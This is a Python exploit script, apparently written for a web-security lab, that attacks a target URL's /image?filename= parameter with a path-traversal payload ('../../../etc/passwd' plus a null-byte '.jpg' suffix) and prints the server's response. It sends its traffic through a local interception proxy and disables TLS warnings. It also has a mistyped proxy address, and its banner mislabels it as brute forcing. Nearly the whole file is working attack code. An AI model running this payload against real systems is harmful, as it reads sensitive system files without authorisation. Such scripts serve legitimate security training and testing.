import requests,argparse,urllib3
from random import randrange
from termcolor import colored,COLORS
from colorama import init
from pyfiglet import figlet_format,FigletFont
init(autoreset=True)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.01:8080', 'https': 'http://127.0.0.1:8080'}

def parsearg():
    parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument('-u','--url',
                        dest='url',
                        help='url for the target ex : https://www.example.com',
                        required=True)
   
    return parser.parse_args()


def banner():

    # getting rand font
    List=FigletFont.getFonts()
    random_numbner=randrange(len(List)-1)
    random_font=List[random_numbner]

    # getting rand colore
    color=[]
    for i in COLORS:
        if i !='black' and i!='light_blue' and i!='grey':
            color.append(i)
    random_numbner=randrange(len(color)-1)
    random_colore=color[random_numbner]

    #  printing the banner 
    font=figlet_format('path-traversal',font=random_font)
    print(colored(font,random_colore))
    print(colored("Build a Simple brute forcing Script with Python", 'yellow'))
    print(colored("Author: @oussamabinike\n", 'yellow'))
    
def path_travers_exploit(url):
    path='/image'
    null_byte='%00'
    payload=f'?filename=../../../etc/passwd{null_byte}.jpg'
    image_url =url+path+payload
    r= requests.get(url=image_url,verify=False,proxies=proxies,timeout=1)
    if r.status_code==200:
        print(r.text)
        return True
    else:
        return False
        
def main():
    banner()
    url=parsearg().url
    url=str(url).rstrip('/')
    resulte=path_travers_exploit(url)
    successful=colored('injection successful','green')
    unsuccessful=colored('injection unsuccessful','red')
    l=lambda x:successful if x==True else unsuccessful
    print(l(resulte))

if __name__=='__main__':
    main()
